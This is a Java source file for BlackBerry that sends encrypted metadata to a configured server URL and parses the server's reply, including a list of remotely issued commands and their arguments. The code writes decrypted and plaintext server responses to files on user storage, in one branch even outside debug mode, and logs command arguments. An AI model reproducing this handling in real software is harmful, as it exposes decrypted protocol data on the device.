package com.vvt.prot.command;

import java.io.IOException;
import java.util.Vector;
import net.rim.device.api.util.DataBuffer;
import com.vvt.encryption.AESDecryptor;
import com.vvt.encryption.DataTooLongForRSAEncryptionException;
import com.vvt.http.FxHttp;
import com.vvt.http.FxHttpListener;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.FxHttpRequest;
import com.vvt.http.request.MethodType;
import com.vvt.http.response.FxHttpResponse;
import com.vvt.http.response.SentProgress;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.databuilder.ProtocolPacketBuilder;
import com.vvt.prot.databuilder.ProtocolPacketBuilderResponse;
import com.vvt.prot.databuilder.SendRAskCmdResponse;
import com.vvt.prot.parser.ResponseParser;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.PCCCommand;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;

public class SendRAsk extends Thread implements FxHttpListener {
	
	private static final String TAG = "SendRAsk";
	private String url = null;
	private DataBuffer responseBuffer = new DataBuffer();
	private ProtocolPacketBuilderResponse protPacketBuilderResponse = null; 
	private int numbOfBytes = -1;
	
	private static final String METADATA_FILE 			= "file:///store/home/user/RAskMetaData.dat";
	private static final String DECRYPTED_FILE 			= "file:///store/home/user/Decrypted.dat";
	private static final String PLAIN_TEXT_FILE 		= "file:///store/home/user/PlainText.dat";
	private static final String  RASK_RESPONSE_FILE = "file:///store/home/user/RAskResponse.dat";
	
	public void setUrl(String url){
		this.url = url;
	}
	
	public int doRAsk(CommandMetaData cmdMetaData, long payloadCrc32, long payloadSize, 
					byte[] publicKey, byte[] aesKey, long ssid) throws InterruptedException, 
					NullPointerException, IOException, DataTooLongForRSAEncryptionException {
		
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".doRAsk()", "Start!");
		}
		
		ProtocolPacketBuilder protPacketBuilder = new ProtocolPacketBuilder();
		protPacketBuilderResponse = protPacketBuilder.buildMetaData(cmdMetaData, 
													payloadCrc32, payloadSize, publicKey, aesKey, ssid);
		
		FxHttpRequest request = new FxHttpRequest();
		request.setUrl(url);
		request.setMethod(MethodType.POST);
		request.setContentType(ContentType.BINARY);
		request.addDataItem(protPacketBuilderResponse.getMetaData());
		
		FxHttp http = new FxHttp();
		http.setHttpListener(this);
		http.setRequest(request);
		http.start();
		http.join();		
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".doRAsk()", "End!");
		}
		return numbOfBytes;
	}
	
	public void onHttpError(Throwable err, String msg) {
		numbOfBytes = -1;
		if (Log.isDebugEnable()) {
			Log.error(TAG + ".onHttpError()", msg, err);
		}
	}

	public void onHttpResponse(FxHttpResponse response) {
		responseBuffer.write(response.getBody(), 0, response.getBody().length);
	}

	public void onHttpSentProgress(SentProgress progress) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onHttpSentProgress()", "Sent -> " + progress);
		}
	}

	public void onHttpSuccess(FxHttpResponse result) {
		try {
			CmdResponse cmdResponse = parseResponse();
			
			if (Log.isDebugEnable()) {
				FileUtil.writeToFile(RASK_RESPONSE_FILE, responseBuffer.toArray());
				saveResponseLog(cmdResponse);
				Log.debug(TAG, "onHttpSuccess!");
			}
			
			SendRAskCmdResponse rAskRes = (SendRAskCmdResponse)cmdResponse;
			/*byte[] data = rAskRes.getNumberOfBytes();
			DataBuffer tmp = new DataBuffer(data, 0, data.length, true);
			numbOfBytes = (int)tmp.readLong();*/
			numbOfBytes = (int) rAskRes.getNumberOfBytes();
			
		} catch (Exception e) {
			numbOfBytes = -1;
			Log.error(TAG, "Exception on onHttpSuccess: " + e.getMessage(), e);
			e.printStackTrace();
		}
	}
	
	private CmdResponse parseResponse() throws Exception {
		CmdResponse res = null;
		byte[] responseData = responseBuffer.toArray();
		byte[] cipher = new byte[responseData.length - 1];
		System.arraycopy(responseData, 1, cipher, 0, cipher.length);
		if (responseData[0] == EncryptionType.ENCRYPT_ALL_METADATA.getId()) {
			byte[] data = null;
			Log.debug(TAG, "Decrypt is starting!");
			data = AESDecryptor.decrypt(protPacketBuilderResponse.getAesKey(), cipher);	
			
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "Decrypted!");
				FileUtil.writeToFile(DECRYPTED_FILE, data);
			}
			
			res = ResponseParser.parseStructuredCmd(data);
		} else {
			FileUtil.writeToFile(PLAIN_TEXT_FILE, cipher);
			res = ResponseParser.parseStructuredCmd(cipher);
			
		}
		return res;
	}
	
	private void saveResponseLog(CmdResponse cmdResponse) {
		if (cmdResponse instanceof SendRAskCmdResponse ) {
			SendRAskCmdResponse sendRAskRes = (SendRAskCmdResponse) cmdResponse;
			Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
			if (cmdResponse != null) {
				Log.debug(TAG, " sendRAskRes.getExtStatus(): " 	+ sendRAskRes.getExtStatus());
				Log.debug(TAG, " sendRAskRes.getServerId(): " 	+ sendRAskRes.getServerId());
				Log.debug(TAG, " sendRAskRes.getServerMsg(): " 	+ sendRAskRes.getServerMsg());
				Log.debug(TAG, " sendRAskRes.getStatusCode(): " + sendRAskRes.getStatusCode());
				Log.debug(TAG, " sendRAskRes.getCommand(): " 	+ sendRAskRes.getCommand().getId());
				//byte[] numberOfbytes = sendRAskRes.getNumberOfBytes();
				int numberOfbytes = (int) sendRAskRes.getNumberOfBytes();
				//Log.debug(TAG, " numberOfbytes: " 	+ numberOfbytes[0] + ", " + numberOfbytes[1] + ", " + numberOfbytes[2] + ", " + numberOfbytes[3]);
				Log.debug(TAG, " numberOfbytes: " 	+ numberOfbytes);
				Vector pcc = sendRAskRes.getPCCCommands();
				Log.debug(TAG, " PCC Size: " + pcc.size());
				for (int i = 0; i < pcc.size(); i++) {
					PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
					Log.debug(TAG, " nextCmd.getCmdId(): " 	+ nextCmd.getCmdId().getId());
					Vector arg = nextCmd.getArguments();
					for (int j = 0; j < arg.size(); j++) {
						String argument = (String)arg.elementAt(j);
						Log.debug(TAG, " Argument: " + argument);
					}
				}
			}
		}
	}
}
